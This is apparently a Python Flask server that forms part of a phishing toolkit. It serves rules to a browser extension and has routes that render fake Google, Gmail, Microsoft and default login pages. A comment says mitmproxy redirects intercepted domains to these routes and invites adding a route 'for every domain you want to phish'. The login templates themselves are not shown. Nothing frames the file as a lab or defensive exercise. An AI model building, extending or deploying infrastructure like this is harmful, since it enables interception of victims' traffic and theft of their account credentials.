from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from utils import get_rules, get_config

app = Flask(__name__)

CORS(app)


# ---------------------------------------------------------------------------
# API: serves extension rules
# ---------------------------------------------------------------------------

@app.route('/rules', methods=['GET'])
def query_rules():
    rules = get_rules()
    return jsonify(rules)


# ---------------------------------------------------------------------------
# Internal phishing routes – mitmproxy redirects matching domains here.
# Add a new route for every domain you want to phish.
# ---------------------------------------------------------------------------

@app.route('/phish/google', methods=['GET', 'POST'])
def phish_google():
    return render_template('google.html')


@app.route('/phish/gmail', methods=['GET', 'POST'])
def phish_gmail():
    return render_template('gmail.html')


@app.route('/phish/microsoft', methods=['GET', 'POST'])
def phish_microsoft():
    return render_template('microsoft.html')


@app.route('/phish/default', methods=['GET', 'POST'])
def phish_default():
    return render_template('default.html')


# ---------------------------------------------------------------------------
# Catch-all: any request that hits the internal server but doesn't match
# a specific route returns a simple 404 page.
# ---------------------------------------------------------------------------

@app.errorhandler(404)
def not_found(_e):
    return "Route not configured", 404


if __name__ == '__main__':
    app.run(host="127.0.0.1", debug=True, port=9000)


